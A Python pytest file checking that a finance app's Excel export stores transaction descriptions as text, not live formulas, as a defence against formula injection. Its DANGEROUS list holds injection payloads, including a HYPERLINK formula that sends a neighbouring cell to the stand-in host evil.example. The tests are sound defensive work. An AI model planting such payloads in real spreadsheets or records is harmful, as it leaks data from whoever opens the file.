"""A description must never become a formula in the export.

openpyxl stores a string beginning with "=" as a FORMULA, not as text. So a
transaction described as `=HYPERLINK("http://…/?"&A1,"CLICK")` becomes live in
the workbook, and fires the moment the owner opens their own export - sending
the neighbouring cell to whoever wrote the description.

Some of that text comes from outside the app: a bank narration, an imported
statement, a payee name lifted off a payment alert. The person whose export it
is need not have typed any of it.

Verified before the fix: data_type was 'f'.
"""
import io
import uuid
from datetime import datetime, timezone

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient
from openpyxl import load_workbook
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from app.core.security import create_access_token, hash_password
from app.db.database import get_db
from app.models.models import Account, Base, Transaction, User
from main import app

pytestmark = pytest.mark.asyncio

#: Every one of these makes Excel evaluate the cell. A leading "-" counts
#: because "-1+1" is arithmetic; a tab or return can push one of the others
#: to the front where the eye does not see it.
DANGEROUS = [
    '=HYPERLINK("http://evil.example/?"&A1,"CLICK ME")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\tSUM(A1)',
    '\r=1+1',
]


@pytest_asyncio.fixture
async def api():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    factory = async_sessionmaker(bind=engine, class_=AsyncSession, expire_on_commit=False)

    async def _db():
        async with factory() as session:
            yield session

    app.dependency_overrides[get_db] = _db

    user_id, account_id = uuid.uuid4(), uuid.uuid4()
    async with factory() as session:
        session.add(User(id=user_id, email="inject@example.com",
                         password_hash=hash_password("x"), display_name="Inject"))
        session.add(Account(id=account_id, user_id=user_id, name="A",
                            account_type="asset", currency="INR", opening_balance_minor=0))
        await session.commit()
        for text in DANGEROUS:
            session.add(Transaction(
                client_mutation_id=uuid.uuid4(), user_id=user_id, account_id=account_id,
                transaction_type="expense", amount_minor=100, currency="INR",
                description=text, transaction_date=datetime.now(timezone.utc),
                device_id="test"))
        await session.commit()

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        client.headers["Authorization"] = f"Bearer {create_access_token({'sub': str(user_id)})}"
        yield client

    app.dependency_overrides.clear()


async def _workbook(client):
    res = await client.get("/api/profile/export.xlsx")
    assert res.status_code == 200, res.text[:200]
    return load_workbook(io.BytesIO(res.content))


class TestNothingInTheExportIsAFormula:
    async def test_no_cell_is_stored_as_a_formula(self, api):
        workbook = await _workbook(api)
        formulas = [
            f"{sheet.title}!{cell.coordinate} = {cell.value!r}"
            for sheet in workbook.worksheets
            for row in sheet.iter_rows()
            for cell in row
            if cell.data_type == "f"
        ]
        assert formulas == [], f"these cells would execute on open: {formulas}"

    async def test_every_dangerous_description_survives_as_text(self, api):
        """Pinned to string, not rewritten.

        The alternative mitigation - prefixing an apostrophe - would make the
        export disagree with the ledger it is an export OF. Nothing here alters
        a value; only the cell's type is corrected.
        """
        workbook = await _workbook(api)

        # A carriage return comes back as a newline: XML normalises line
        # endings on the way through, which is openpyxl's storage layer rather
        # than anything the sanitiser did. Compared with that normalised, so
        # the test measures the fix and not the file format.
        def normalise(text: str) -> str:
            return text.replace("\r\n", "\n").replace("\r", "\n")

        seen = {
            normalise(cell.value)
            for sheet in workbook.worksheets
            for row in sheet.iter_rows()
            for cell in row
            if isinstance(cell.value, str)
        }
        for text in DANGEROUS:
            assert normalise(text) in seen, (
                f"{text!r} was altered or dropped rather than kept as text")

    async def test_ordinary_descriptions_are_untouched(self, api):
        workbook = await _workbook(api)
        cells = [
            cell for sheet in workbook.worksheets for row in sheet.iter_rows()
            for cell in row
        ]
        # The amounts must still be numbers - the fix must not have turned the
        # whole sheet into text, which would make the file useless in Excel.
        assert any(isinstance(c.value, (int, float)) for c in cells)
